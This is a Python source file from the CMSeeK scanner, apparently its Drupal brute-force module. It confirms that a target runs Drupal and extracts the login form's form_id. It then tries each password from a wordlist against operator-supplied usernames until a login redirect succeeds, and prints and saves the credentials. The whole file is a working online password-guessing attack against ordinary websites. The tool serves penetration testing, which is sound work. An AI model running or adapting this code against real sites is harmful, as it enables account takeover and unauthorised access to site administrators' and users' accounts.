#!/usr/bin/python3
# -*- coding: utf-8 -*-
# This is a part of CMSeeK, check the LICENSE file for more information
# Copyright (c) 2018 - 2020 Tuhinshubhra
### Drupal Bruteforce module
### Version 1.0
### Honestly this is kinda useless as drupal blocks an account for some time after 5 failed attempt (maybe this is one fix in the next version!)
### cmseekbruteforcemodule <- make sure you include this comment in any custom modules you create so that cmseek can recognize it as a part of it's module


import cmseekdb.basic as cmseek # I don't feel like commenting
import cmseekdb.sc as source # Contains function to detect cms from source code
import cmseekdb.header as header # Contains function to detect CMS from gathered http headers
import multiprocessing ## Let's speed things up a lil bit (actually a hell lot faster) shell we?
from functools import partial ## needed somewhere :/
import sys
import requests
import re
import cmseekdb.generator as generator


def testlogin(url,user,passw,formid):

    if url.endswith('/'):
        loginUrl = url + 'user/login/'
        redirect = url + 'user/1/'
    else:
        loginUrl = url + '/user/login/'
        redirect = url + '/user/1/'

    post = { 'name': user, 'pass': passw, 'form_id': formid, 'op': 'Log in', 'location': redirect }
    session = requests.Session()
    response = session.post(loginUrl, data=post)
    return response.url

def start():
    cmseek.clearscreen()
    cmseek.banner("Drupal Bruteforce Module")
    url = cmseek.targetinp("") # input('Enter Url: ')
    cmseek.info("Checking for Drupal")
    bsrc = cmseek.getsource(url, cmseek.randomua('onceuponatime'))
    if bsrc[0] != '1':
        cmseek.error("Could not get target source, CMSeek is quitting")
        cmseek.handle_quit()
    else:
        ## Parse generator meta tag
        parse_generator = generator.parse(bsrc[1])
        ga = parse_generator[0]
        ga_content = parse_generator[1]

        try1 = generator.scan(ga_content)
        if try1[0] == '1' and try1[1] == 'dru':
            drucnf = '1'
        else:
            try2 = source.check(bsrc[1], url) # Confirming Drupal using other source code checks
            if try2[0] == '1' and try2[1] == 'dru':
                drucnf = '1'
            else:
                try3 = header.check(bsrc[2]) # Headers Check!
                if try3[0] == '1' and try3[1] == 'dru':
                    drucnf = '1'
                else:
                    drucnf = '0'
    if drucnf != '1':
        cmseek.error('Could not confirm Drupal... CMSeek is quitting')
        cmseek.handle_quit()
    else:
        cmseek.success("Drupal Confirmed... Checking for Drupal login form")
        druloginsrc = cmseek.getsource(url + '/user/login/', cmseek.randomua('therelivedaguynamedkakashi'))
        if druloginsrc[0] == '1' and '<form' in druloginsrc[1] and 'name="form_id" value="' in druloginsrc[1]:
            cmseek.success("Login form found! Retriving form id value")
            fid = re.findall(r'name="form_id" value="(.*?)"', druloginsrc[1])
            if fid == []:
                cmseek.error("Could not find form_id, CMSeeK is quitting!")
                cmseek.handle_quit()
            else:
                cmseek.success('form_id found: ' + cmseek.bold + fid[0] + cmseek.cln)
                form_id = fid[0]
            druparamuser = ['']
            rawuser = input("[~] Enter Usernames with coma as separation without any space (example: cris,harry): ").split(',')
            for rusr in rawuser:
                druparamuser.append(rusr)
            drubruteusers = set(druparamuser) ## Strip duplicate usernames

            for user in drubruteusers:
                if user != '':
                    print('\n')
                    cmseek.info("Bruteforcing User: " + cmseek.bold + user + cmseek.cln)
                    pwd_file = open("wordlist/passwords.txt", "r")
                    passwords = pwd_file.read().split('\n')
                    passwords.insert(0, user)
                    passfound = '0'
                    for password in passwords:
                        if password != '' and password != '\n':
                            sys.stdout.write('[*] Testing Password: ')
                            sys.stdout.write('%s\r\r' % password)
                            sys.stdout.flush()
                            cursrc = testlogin(url, user, password, form_id)
                            # print(cursrc)
                            if '/user/login/' in str(cursrc):
                                continue
                            else:
                                cmseek.success('Password found! \n\n\n')
                                # print (cursrc)
                                cmseek.success('Password found!')
                                print(" |\n |--[username]--> " + cmseek.bold + user + cmseek.cln + "\n |\n |--[password]--> " + cmseek.bold + password + cmseek.cln + "\n |")
                                cmseek.success('Enjoy The Hunt!')
                                cmseek.savebrute(url,url + '/user/login',user,password)
                                passfound = '1'
                                break
                            break
                    if passfound == '0':
                        cmseek.error('\n\nCould Not find Password!')
                    print('\n\n')

        else:
            cmseek.error("Couldn't find login form... CMSeeK is quitting")
            cmseek.handle_quit()
